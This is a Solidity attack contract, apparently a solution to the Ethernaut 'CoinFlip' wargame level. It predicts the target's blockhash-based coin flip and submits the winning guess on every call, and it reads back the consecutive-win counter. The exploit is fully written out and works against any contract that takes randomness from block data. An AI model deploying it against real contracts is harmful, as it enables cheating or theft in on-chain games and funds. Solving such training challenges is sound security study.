// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "contracts/CoinFlip.sol";
contract CoinFlipAttacker{


    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public ethernautCoinFlip;
    
    constructor(address _ethernautCoinFlipAddress){
        ethernautCoinFlip = CoinFlip(_ethernautCoinFlipAddress);
    }

    function hackCoinFlipGuess(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true:false;

        if (side == _guess){
            ethernautCoinFlip.flip(_guess);
        }else{
            ethernautCoinFlip.flip(!_guess);
        }

    }

    function getCoinFlipConsecWins() public view returns(uint256 consecWins){
        consecWins = ethernautCoinFlip.consecutiveWins();
    }


}
